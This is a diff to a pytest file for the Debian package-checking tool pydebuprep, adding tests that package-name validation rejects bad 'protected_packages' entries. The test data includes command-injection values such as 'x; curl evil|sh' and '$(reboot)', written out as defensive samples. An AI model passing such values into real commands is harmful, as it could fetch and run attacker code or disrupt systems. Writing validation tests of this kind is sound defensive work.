@@ -4,6 +4,8 @@ from __future__ import annotations
 
 from typing import Any
 
+import pytest
+
 from pydebuprep.checks.apt_upgradable import SIMULATE_UPGRADE, AptUpgradableCheck
 from pydebuprep.model import Finding, Severity
 
@@ -356,3 +358,15 @@ def test_a_removed_library_is_not_called_installed_by_hand() -> None:
         (Severity.WARNING, "1 package marked as installed by hand was removed", ["tool 1"]),
         (Severity.INFO, "1 package removed since baseline", ["libssl3 3"]),
     ]
+
+
+@pytest.mark.parametrize("name", ["x; curl evil|sh", "$(reboot)", "-o", "a b", "", "A"])
+def test_protected_packages_must_be_package_names(name: str) -> None:
+    """They go into a suggested sudo command, and a fetched config may set them."""
+    with pytest.raises(ValueError, match="protected_packages"):
+        ObsoletePackagesCheck({"protected_packages": [name]})
+
+
+def test_protected_packages_take_real_package_names() -> None:
+    names = ["openssh-server", "libc6:i386", "g++", "python3.12"]
+    assert ObsoletePackagesCheck({"protected_packages": names}).opt("protected_packages") == names
